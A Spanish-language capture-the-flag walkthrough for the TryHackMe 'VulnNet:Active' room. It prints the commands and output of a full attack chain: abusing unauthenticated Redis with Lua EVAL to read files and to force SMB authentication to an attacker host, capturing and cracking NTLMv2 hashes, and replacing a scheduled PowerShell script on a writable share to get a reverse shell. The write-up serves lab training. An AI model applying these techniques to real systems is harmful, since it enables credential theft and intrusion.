## TryHackMe  <> VulnNet:Active

![image](https://github.com/Esevka/CTF/assets/139042999/c8b2b883-92a5-4ef7-9caf-9ef5029519b8)

Enlace Maquina: https://tryhackme.com/room/vulnnetactive

Enunciado : 

  - Obtener acceso completo al sistema y comprometer dominio.
  - Conseguir Flags
---

## Escaneo de puertos (NMAP).

-Buscamos puertos abiertos en en la maquina victima.

    ┌──(root㉿kali)-[/home/…/ctf/try_ctf/VulnNetActive/nmap]
    └─# nmap -p- -open -sS --min-rate 5000 -n -Pn -vvv 10.10.12.222 -oG open_ports                                                                              
    Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-20 06:32 CEST
    
    PORT      STATE SERVICE      REASON
    53/tcp    open  domain       syn-ack ttl 127
    135/tcp   open  msrpc        syn-ack ttl 127
    139/tcp   open  netbios-ssn  syn-ack ttl 127
    445/tcp   open  microsoft-ds syn-ack ttl 127
    464/tcp   open  kpasswd5     syn-ack ttl 127
    6379/tcp  open  redis        syn-ack ttl 127
    9389/tcp  open  adws         syn-ack ttl 127
    49665/tcp open  unknown      syn-ack ttl 127
    49668/tcp open  unknown      syn-ack ttl 127
    49669/tcp open  unknown      syn-ack ttl 127
    49670/tcp open  unknown      syn-ack ttl 127
    49684/tcp open  unknown      syn-ack ttl 127
    49698/tcp open  unknown      syn-ack ttl 127

  -Extraemos los puertos de la captura anterior para lanzarles unos scripts basicos de reconocimiento.

  Utilizamos un Script en bash simple pero de gran ayuda. Script-->  https://github.com/Esevka/CTF/tree/main/Bash

    ┌──(root㉿kali)-[/home/…/ctf/try_ctf/VulnNetActive/nmap]
    └─# list_port open_ports              
    
    [+]Puertos Disponibles --> (Copiados en el Clipboard)
    
    53,135,139,445,464,6379,9389,49665,49668,49669,49670,49684,49698


  -Lanzamos scripts basicos de reconocimiento sobre los puertos abiertos.

    ┌──(root㉿kali)-[/home/…/ctf/try_ctf/VulnNetActive/nmap]
    └─# nmap -p 53,135,139,445,464,6379,9389,49665,49668,49669,49670,49684,49698 -sCV -n -Pn 10.10.12.222 -vvv -oN info_ports
    
    PORT      STATE SERVICE       REASON          VERSION
    53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
    135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
    139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
    445/tcp   open  microsoft-ds? syn-ack ttl 127
    464/tcp   open  kpasswd5?     syn-ack ttl 127
    6379/tcp  open  redis         syn-ack ttl 127 Redis key-value store 2.8.2402
    9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
    49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
    49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
    49669/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
    49670/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
    49684/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
    49698/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
    
---
## Analizamos la informacion obtenida sobre los puertos.

La informacion obtenida sobre los puertos es un poco escueta, pero aun asi hay un puerto que llama la atencion.

--Puerto 6379 (Redis)

      Que es Redis?
      
      Redis es una base de datos en memoria de código abierto y un almacén de datos de tipo clave-valor.
      
      Esto significa que los ejemplos de uso de Redis no se parecerán a las tablas de una base de datos relacional típica,
      sino que se centrarán en cómo almacenar y recuperar datos utilizando claves.
  
      Redis es eficiente en la gestión de datos clave-valor y es especialmente útil para almacenar datos temporales, configuraciones, caché 
      y en situaciones donde se requiere alta velocidad y baja latencia.

  Info--> Redis Pentesting[+] https://exploit-notes.hdks.org/exploit/database/redis-pentesting/
  
  1)  Conectamos a la BD sin credenciales a ver si podemos obtener algo.

          ┌──(root㉿kali)-[/home/…/ctf/try_ctf/VulnNetActive/nmap]
          └─# redis-cli -h 10.10.12.222
          10.10.12.222:6379> 

  2)  Listamos el número de claves que continenen las bases de datos, no hay nada.
    
          10.10.12.222:6379[3]> info keyspace
          # Keyspace

  3)  Listamos todas las configuraciones y sus valores actuales.
  
          102) "no"
          103) "dir"
          104) "C:\\Users\\enterprise-security\\Downloads\\Redis-x64-2.8.2402"  ---> INTERESANTE
          105) "maxmemory-policy"
      
        De la linea 104 deducimos que --> enterprise-security <-- es un usuario local del sistema, por lo que ya tenemos un usuario del sistema.
      
          Info: Redis mediante el comando EVAL nos permite ejecutar scripts en Lua los cuales deben ser pasados como cadena(String).

  4)  Sabiendo esto podriamos leer la flag de usuario.(La ip cambia hemos tenido que reiniciar la maquina.)

          10.10.240.193:6379> Eval "dofile('C:\\\\Users\\\\enterprise-security\\\\Desktop\\\\user.txt')" 0
          (error) ERR Error running script (call to f_ce5d85ea1418770097e56c1b605053114cc3ff2e): @user_script:1: C:\Users\enterprise-security\Desktop\user.txt:1: malformed number near 
          '3eb176aee96---------0bc93580b291e'

  5)  Capturamos el Hash NTLM del usuario --> enterprise-security.(La ip cambia hemos tenido que reiniciar la maquina.)

      Este proceso lo podemos hacer montandonos nuestro servidor SMB con impacket-smbserver o utilizando la herramienta Responder.

          Que es Responder?
          La función principal de Responder es realizar ataques de captura de credenciales en redes locales.
          Responder se utiliza para interceptar y robar las credenciales de autenticación enviadas a través de protocolos como
          NTLMv1/v2, SMB, HTTP, FTP y otros, en un entorno de red local.

      - impacket-smbserver
    
          Montamos nuestro servidor smb.

            ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/VulnNetActive]
            └─# impacket-smbserver -smb2support  share content
            Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
            
            [*] Config file parsed
            [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
            [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
            [*] Config file parsed
            [*] Config file parsed
            [*] Config file parsed

          Ejecutamos desde Redis una solicitud SMB hacia nuestro servidor.

            10.10.33.40:6379> eval "dofile('//10.9.92.151/SHARE')" 0
            (error) ERR Error running script (call to f_c41ff8afa3459ca8b3df47f2f43eeff829ebc86a): @user_script:1: cannot open //10.9.92.151/SHARE: Invalid argument 
            (2.31s)

          Obtenemos Hash NTLMV2 del usuario que ejecuta el script en redis.

            [*] Incoming connection (10.10.33.40,49740)
            [*] AUTHENTICATE_MESSAGE (VULNNET\enterprise-security,VULNNET-BC3TCK1)
            [*] User VULNNET-BC3TCK1\enterprise-security authenticated successfully
            [*] enterprise-security::VULNNET:aaaaaaaaaaaaaaaa:826d31c9d6d3fed560b400fc941fa5e3:010100000000000080ae2d4fb004da014152ba9ee9a34fc6000000000100100041004c0054005100630078004f006d000300100041004c0054005100630078004f006d00020010006400630057006b0051004b0062005000040010006400630057006b0051004b00620050000700080080ae2d4fb004da0106000400020000000800300030000000000000000000000000300000046ba46932feaab5b12c5be8f2ce373b121545e2bdaca1df101fba9ca819fff90a001000000000000000000000000000000000000900200063006900660073002f00310030002e0039002e00390032002e003100350031000000000000000000
            [*] Closing down connection (10.10.33.40,49740)

  
      - Responder (Montamos nuestro servidor SMB, y ejecutamos el script desde Redis de igual forma.)

            ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/VulnNetActive]
            └─# responder -I tun0   
                                                     __
              .----.-----.-----.-----.-----.-----.--|  |.-----.----.
              |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
              |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                               |__|
            [+] Servers:
            HTTP server                [ON]
            HTTPS server               [ON]
            WPAD proxy                 [OFF]
            Auth proxy                 [OFF]
            SMB server                 [ON] ----> ACTIVO
            [....]

            [+] Listening for events...                                                                                                                                                                                          
            [SMB] NTLMv2-SSP Client   : 10.10.33.40
            [SMB] NTLMv2-SSP Username : VULNNET\enterprise-security
            [SMB] NTLMv2-SSP Hash     : enterprise-security::VULNNET:80933ecbe80b6a14:99294BC45DC5BB0511BDD1CF5F02A4A6:01010000000000000052DE73C104DA01C260066F87230DFA00000000020008005400370056004F0001001E00570049004E002D0050005200490037004E0038004E005A004C0042004B0004003400570049004E002D0050005200490037004E0038004E005A004C0042004B002E005400370056004F002E004C004F00430041004C00030014005400370056004F002E004C004F00430041004C00050014005400370056004F002E004C004F00430041004C00070008000052DE73C104DA0106000400020000000800300030000000000000000000000000300000046BA46932FEAAB5B12C5BE8F2CE373B121545E2BDACA1DF101FBA9CA819FFF90A001000000000000000000000000000000000000900200063006900660073002F00310030002E0039002E00390032002E003100350031000000000000000000  
            
  6)  Intentamos crakear el hash con john.

            ──(root㉿kali)-[/home/…/ctf/try_ctf/VulnNetActive/content]
            └─# john hash_ntlm --wordlist=/usr/share/wordlists/rockyou.txt
            Using default input encoding: UTF-8
            Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
            Will run 3 OpenMP threads
            Press 'q' or Ctrl-C to abort, almost any other key for status
            sand_0873959498  (enterprise-security)     
            1g 0:00:00:02 DONE (2023-10-22 08:34) 0.4566g/s 1833Kp/s 1833Kc/s 1833KC/s sande06..sanat85
            Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
            Session completed. 

      Conseguimos credenciales validas en el sistema ---> enterprise-security:sand_0873959498


--Puerto 445 (SMB)

  - Con crackmapexec listamos los recurso compartido desponible para el usuario enterprise-security

        ┌──(root㉿kali)-[/home/…/ctf/try_ctf/VulnNetActive/content]
        └─# crackmapexec smb 10.10.33.40 -u enterprise-security -p sand_0873959498 --shares
        SMB         10.10.33.40     445    VULNNET-BC3TCK1  [*] Windows 10.0 Build 17763 x64 (name:VULNNET-BC3TCK1) (domain:vulnnet.local) (signing:True) (SMBv1:False)
        SMB         10.10.33.40     445    VULNNET-BC3TCK1  [+] vulnnet.local\enterprise-security:sand_0873959498 
        SMB         10.10.33.40     445    VULNNET-BC3TCK1  [+] Enumerated shares
        SMB         10.10.33.40     445    VULNNET-BC3TCK1  Share           Permissions     Remark
        SMB         10.10.33.40     445    VULNNET-BC3TCK1  -----           -----------     ------
        SMB         10.10.33.40     445    VULNNET-BC3TCK1  ADMIN$                          Remote Admin
        SMB         10.10.33.40     445    VULNNET-BC3TCK1  C$                              Default share
        SMB         10.10.33.40     445    VULNNET-BC3TCK1  Enterprise-Share READ            
        SMB         10.10.33.40     445    VULNNET-BC3TCK1  IPC$            READ            Remote IPC
        SMB         10.10.33.40     445    VULNNET-BC3TCK1  NETLOGON        READ            Logon server share 
        SMB         10.10.33.40     445    VULNNET-BC3TCK1  SYSVOL          READ            Logon server share 

  - Nos conectamos al recuerto Enterprise-Share y nos descargamos el scrip en Powershell que contine.

        ┌──(root㉿kali)-[/home/…/ctf/try_ctf/VulnNetActive/content]
        └─# smbclient //10.10.33.40/Enterprise-Share -U enterprise-security 
        Password for [WORKGROUP\enterprise-security]:
        Try "help" to get a list of possible commands.
        smb: \> dir
          .                                   D        0  Tue Feb 23 23:45:41 2021
          ..                                  D        0  Tue Feb 23 23:45:41 2021
          PurgeIrrelevantData_1826.ps1        A       69  Wed Feb 24 01:33:18 2021


        smb: \> get PurgeIrrelevantData_1826.ps1
        getting file \PurgeIrrelevantData_1826.ps1 of size 69 as PurgeIrrelevantData_1826.ps1 (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)


  - Analizamos el script y obtenemos Shell.

        Basicamente el script borra si o si todo el contenido de Documentos del usuario Public y en caso de error continua haciendo caso omiso a dicho error.

    Probamos a subir de nuevo dicho script para ver si tenemos permiso de escritura en el recuerso compartido y perfecto podemos subir ficheros al recurso.
      
        smb: \> put PurgeIrrelevantData_1826.ps1 
        putting file PurgeIrrelevantData_1826.ps1 as \PurgeIrrelevantData_1826.ps1 (0.0 kb/s) (average 0.0 kb/s)
        smb: \> dir
          .                                   D        0  Tue Feb 23 23:45:41 2021
          ..                                  D        0  Tue Feb 23 23:45:41 2021
          PurgeIrrelevantData_1826.ps1        A       69  Sun Oct 22 08:50:55 2023
  
    Vamos a probar a modificar el script con una reverse shell.
    
        Tiene pinta de que el script se ejecute como tarea programada para ir eliminando ficheros innecesarios,logs etc.

      ![image](https://github.com/Esevka/CTF/assets/139042999/2d7fe7b9-5e4c-4339-b750-dc824e53284d)

      - Nos ponemos en escucha y subimos nuestro script modificado.(Tarda un poco para recibir la R.shell)
   
            ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/VulnNetActive]
            └─# rlwrap nc -lnvp 1988    
            listening on [any] 1988 ...
            connect to [10.9.92.151] from (UNKNOWN) [10.10.33.40] 49991
            whoami
            vulnnet\enterprise-security
            PS C:\Users\enterprise-security\Downloads>


            smb: \> put PurgeIrrelevantData_1826.ps1 
            putting file PurgeIrrelevantData_1826.ps1 as \PurgeIrrelevantData_1826.ps1 (0.3 kb/s) (average 0.3 kb/

## Escala de Privilegios.

Podemos obtener la flag de user.txt desde la consola.

    PS C:\Users\enterprise-security\Desktop> type user.txt
    THM{3eb176aee964-----------00bc93580b291e}


  

    
    
      

  
        

        
    
  



    


    
    




  






  

  


